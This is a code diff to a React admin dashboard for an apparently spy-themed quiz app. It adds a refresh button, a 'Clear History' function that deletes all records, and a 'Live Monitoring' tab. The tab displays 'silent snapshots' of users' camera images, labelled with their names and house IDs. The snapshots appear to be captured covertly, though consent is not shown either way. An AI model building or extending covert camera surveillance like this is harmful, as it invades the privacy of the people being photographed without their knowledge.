@@ -9,7 +9,7 @@ import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
-import { Plus, Trash2, LogOut, LayoutDashboard, Database, Users, CheckCircle2, Mail } from 'lucide-react';
+import { Plus, Trash2, LogOut, LayoutDashboard, Database, Users, CheckCircle2, Mail, Camera, RefreshCcw } from 'lucide-react';
 import { showError, showSuccess } from '@/utils/toast';
 
 const AdminDashboard = () => {
@@ -17,6 +17,8 @@ const AdminDashboard = () => {
   const [isAdmin, setIsAdmin] = useState(false);
   const [questions, setQuestions] = useState<any[]>([]);
   const [results, setResults] = useState<any[]>([]);
+  const [snapshots, setSnapshots] = useState<any[]>([]);
+  const [isRefreshing, setIsRefreshing] = useState(false);
   const [newQuestion, setNewQuestion] = useState({ text: '', options: ['', '', '', ''], correct_answer: 0 });
 
   useEffect(() => {
@@ -50,13 +52,19 @@ const AdminDashboard = () => {
   };
 
   const fetchData = async () => {
+    setIsRefreshing(true);
     try {
       const { data: qData } = await supabase.from('questions').select('*').order('created_at', { ascending: false });
       const { data: rData } = await supabase.from('leaderboard').select('*').order('created_at', { ascending: false });
+      const { data: sData } = await supabase.from('monitoring_snapshots').select('*').order('created_at', { ascending: false }).limit(100);
+      
       setQuestions(qData || []);
       setResults(rData || []);
+      setSnapshots(sData || []);
     } catch (err) {
       console.error(err);
+    } finally {
+      setIsRefreshing(false);
     }
   };
 
@@ -86,6 +94,13 @@ const AdminDashboard = () => {
     else fetchData();
   };
 
+  const clearSnapshots = async () => {
+    if (!window.confirm("Clear all monitoring history?")) return;
+    const { error } = await supabase.from('monitoring_snapshots').delete().neq('id', '00000000-0000-0000-0000-000000000000');
+    if (error) showError(error.message);
+    else fetchData();
+  };
+
   if (!isAdmin) return (
     <div className="min-h-screen flex items-center justify-center bg-slate-50">
       <div className="text-center">
@@ -102,10 +117,15 @@ const AdminDashboard = () => {
             <LayoutDashboard size={28} />
             <h1 className="text-2xl font-black uppercase tracking-tight">Admin Command</h1>
           </div>
-          <Button variant="outline" onClick={() => supabase.auth.signOut().then(() => navigate('/'))}>
-            <LogOut className="mr-2" size={18} />
-            Logout
-          </Button>
+          <div className="flex items-center gap-2">
+            <Button variant="outline" size="icon" onClick={fetchData} disabled={isRefreshing}>
+              <RefreshCcw className={isRefreshing ? "animate-spin" : ""} size={18} />
+            </Button>
+            <Button variant="outline" onClick={() => supabase.auth.signOut().then(() => navigate('/'))}>
+              <LogOut className="mr-2" size={18} />
+              Logout
+            </Button>
+          </div>
         </header>
 
         <Tabs defaultValue="questions" className="space-y-6">
@@ -115,6 +135,9 @@ const AdminDashboard = () => {
             </TabsTrigger>
             <TabsTrigger value="results" className="rounded-lg gap-2">
               <Users size={16} /> Manage Results
+            </TabsTrigger>
+            <TabsTrigger value="monitoring" className="rounded-lg gap-2">
+              <Camera size={16} /> Live Monitoring
             </TabsTrigger>
           </TabsList>
 
@@ -236,6 +259,44 @@ const AdminDashboard = () => {
                 </TableBody>
               </Table>
             </Card>
+          </TabsContent>
+
+          <TabsContent value="monitoring" className="space-y-6">
+            <div className="flex justify-between items-center">
+              <div>
+                <h3 className="text-lg font-bold text-slate-800">Live Surveillance</h3>
+                <p className="text-sm text-slate-500">View silent snapshots from active operatives.</p>
+              </div>
+              <Button variant="destructive" size="sm" onClick={clearSnapshots}>
+                <Trash2 className="mr-2" size={16} /> Clear History
+              </Button>
+            </div>
+
+            <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
+              {snapshots.map((s) => (
+                <Card key={s.id} className="overflow-hidden border-none shadow-md bg-white hover:ring-2 ring-indigo-500 transition-all group">
+                  <div className="aspect-video relative bg-slate-100">
+                    <img src={s.snapshot} alt={s.user_name} className="w-full h-full object-cover" />
+                    <div className="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 transition-opacity flex flex-col items-center justify-center p-2 text-center">
+                      <p className="text-white text-[10px] font-bold truncate w-full">{s.user_name}</p>
+                      <p className="text-indigo-200 text-[8px] truncate w-full">{s.house_id}</p>
+                    </div>
+                  </div>
+                  <div className="p-2 bg-white">
+                    <div className="flex items-center justify-between">
+                      <span className="text-[10px] font-black text-indigo-900 truncate flex-1">{s.user_name}</span>
+                      <span className="text-[8px] text-slate-400">{new Date(s.created_at).toLocaleTimeString()}</span>
+                    </div>
+                  </div>
+                </Card>
+              ))}
+              {snapshots.length === 0 && (
+                <div className="col-span-full py-20 text-center text-slate-400">
+                  <Camera size={40} className="mx-auto mb-4 opacity-20" />
+                  <p>No active surveillance data found.</p>
+                </div>
+              )}
+            </div>
           </TabsContent>
         </Tabs>
       </div>
